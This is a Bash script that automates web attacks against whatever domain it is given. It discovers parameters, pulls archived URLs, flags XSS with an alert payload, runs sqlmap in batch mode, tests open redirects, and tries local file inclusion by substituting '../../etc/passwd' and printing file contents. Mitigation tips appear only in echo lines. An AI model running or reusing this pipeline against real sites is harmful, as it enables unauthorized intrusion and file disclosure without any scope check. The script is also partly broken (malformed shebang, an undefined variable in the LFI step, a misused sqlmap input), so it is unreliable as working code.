#/bin/bash

validate_domain() {
	local domain=$1

	echo "######################################################################"
	echo "Validating Domain Format"
	echo "######################################################################"

	# Regex pattern for domain/subdomain validation
	local pattern="^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"

	# Check if the input matches the pattern
	if [[ $domain =~ $pattern ]]; then
		echo -e "Valid domain/subdomain format: $domain"
		# Check if the domain is live or down
		check_domain_status "$domain"
	else
		echo -e "Error: Invalid domain/subdomain format: $domain"
		exit 1
	fi
}

check_domain_status() {
	local domain=$1

	echo "######################################################################"
	echo "Checking Domain/Subdomain Connection"
	echo "######################################################################"
	# Check if the domain is live by sending a ping request
	if ping -c 1 "$domain" &>/dev/null; then
		echo -e "Domain is live: $domain"
	else
		echo -e "Error: Domain is down: $domain"
		exit 1
	fi
}

param_discovery() {
    local domain=$1

	echo "######################################################################"
	echo "Parameter Discovery"
	echo "######################################################################"
	paramspider -d $domain &> /dev/null
	cat results/$domain.txt
	echo "######################################################################"
	echo "Finding or Discovering parameters is an important thing that helps attackers in finding bugs."
	echo "######################################################################"
	echo "Validating the parameters as an input and sanitizing it."
}

wayback_machine() {
    local domain=$1

	echo "######################################################################"
	echo "Extracting URLs from Waybackmachine"
	echo "######################################################################"
	echo "$domain" | waybackurls | tee wayback.txt
	echo "######################################################################"
	echo "Finding or Discovering parameters is an important thing that helps attackers in finding bugs."
	echo "######################################################################"
	echo "Validating the parameters as an input and sanitizing it."
}

xss_scan() {
    local domain=$1

	echo "######################################################################"
	echo "Scanning XSS"
	echo "######################################################################"
	cat wayback.txt | gf xss | tee xss.txt
	cat results/$domain.txt xss.txt | kxss | tee possible_xss.txt
	while IFS= read -r line; do
        # Extract URL, Param, and Unfiltered fields
        url=$(echo "$line" | grep -oP '(?<=URL: ).*?(?= Param:)')
        param=$(echo "$line" | grep -oP '(?<=Param: ).*?(?= Unfiltered:)')
        unfiltered=$(echo "$line" | grep -oP '(?<=Unfiltered: ).*')

        # Check if unfiltered contains < or >
        if [[ $unfiltered == *"<"* ]] || [[ $unfiltered == *">"* ]]; then
            echo "Vulnerable to XSS: $url?${param}=<script>alert('XSS')</script>"
        fi
    done < possible_xss.txt
	echo "######################################################################"
	echo "Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into webpages viewed by users."
	echo "######################################################################"
	echo "Implement robust input validation and output encoding, utilize Content Security Policy (CSP), and sanitize user inputs to prevent script injection."
}

sqli_scan() {
    local domain=$1

	echo "######################################################################"
	echo "Scanning SQLi"
	echo "######################################################################"
	cat wayback.txt | gf sqli | tee sqli.txt
    cat results/$domain.txt sqli.txt | sqlmap --batch | tee possible_sqli.txt
	echo "######################################################################"
	echo "SQL Injection (SQLi) allows attackers to manipulate queries to the database by injecting malicious SQL code through input fields, potentially leading to unauthorized data access and modification."
	echo "######################################################################"
	echo "Use prepared statements and parameterized queries, employ input validation, and sanitize inputs to prevent SQL code from being executed."
}

redirect_scan() {
    local domain=$1

	echo "######################################################################"
	echo "Scanning Open Redirect"
	echo "######################################################################"
	cat wayback.txt | gf redirect | tee redirect.txt
    python3 ../tools/Oralyzer/oralyzer.py -l results/$1.txt redirect.txt
	echo "######################################################################"
	echo "An open redirect vulnerability occurs when an application accepts untrusted input to craft URLs that cause a redirect to an external site, potentially leading to phishing or malware distribution."
	echo "######################################################################"
	echo "Validate and sanitize all input used in redirects, and only allow redirects to trusted, whitelisted URLs."
}

lfi_scan() {

	echo "######################################################################"
	echo "Scanning Local File Inclusion"
	echo "######################################################################"
	cat results/$domain.txt wayback.txt | gf lfi | tee lfi.txt
	cat lfi.txt | qsreplace '../../etc/passwd' | tee possible_lfi.txt
    while IFS= read -r url; do
        response=$(curl -s "$url")

        if echo "$response" | grep -q "root:"; then
            echo "Vulnerable to LFI: $url"
            echo "Response:"
            echo "$response"
        fi
    done < possible_lfi.txt

	echo "######################################################################"
	echo "LFI (Local File Inclusion) vulnerability allows an attacker to include files on a server through the web browser, potentially leading to unauthorized access or code execution."
	echo "######################################################################"
	echo "Implement proper input validation and use whitelisting techniques to restrict file inclusion to authorized directories and files."
}


# Main function to process the input
process_input() {
	local input=$1

	if validate_domain "$input" && check_domain_status "$input"; then
		param_discovery "$input"
		wayback_machine "$input"
		xss_scan "$input"
		redirect_scan "$input"
		lfi_scan "$input"
		sqli_scan "$input"
		exit 0
	else
		echo "Error: Domain is down or invalid format."
		exit 1
	fi
}

# Get user input
input=$1

# Call the main function with the user input
process_input "$input"


